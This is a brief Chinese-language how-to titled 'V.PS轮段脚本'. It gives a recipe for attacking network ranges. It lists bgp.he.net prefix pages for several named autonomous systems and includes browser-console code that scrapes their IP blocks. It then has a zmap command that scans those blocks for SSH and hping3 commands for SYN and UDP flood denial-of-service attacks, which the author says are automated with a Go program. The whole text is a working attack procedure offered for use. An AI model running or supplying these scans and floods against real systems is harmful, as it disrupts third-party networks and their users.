# V.PS轮段脚本

https://bgp.he.net/AS949#\_prefixes\
https://bgp.he.net/AS4785#\_prefixes\
https://bgp.he.net/AS3214#\_prefixes\
https://bgp.he.net/AS6233#\_prefixes\
https://bgp.he.net/AS8888#\_prefixes\
https://bgp.he.net/AS9312#\_prefixes\
https://bgp.he.net/AS23959#\_prefixes\
https://bgp.he.net/AS43357#\_prefixes\
\
F12控制台输入下面代码采集IP段到剪贴板

```
var tmp = ''
$('tr a').each(function(){
    var a = $(this)[0];
    if(a.href.startsWith('https://bgp.he.net/net/')) {
        tmp += a.text + '\n';
        console.log(a.text);
    }
});
copy(tmp);
```

ip段保存到ips.txt，zmap扫描：

```
apt install -y zmap
zmap -p 22 -o p22.txt -w ips.txt
```

DOS脚本（我写了个go程序自动化了）

```
apt install -y hping3

# syn
hping3 -p 22 -S --flood -V x.x.x.1

# udp小包
hping3 -2 -p 53 --flood -V xxx
# udp大包（1400改成机器mtu）
hping3 -2 -p 53 -d 1400 --flood -V x.x.x.1

```
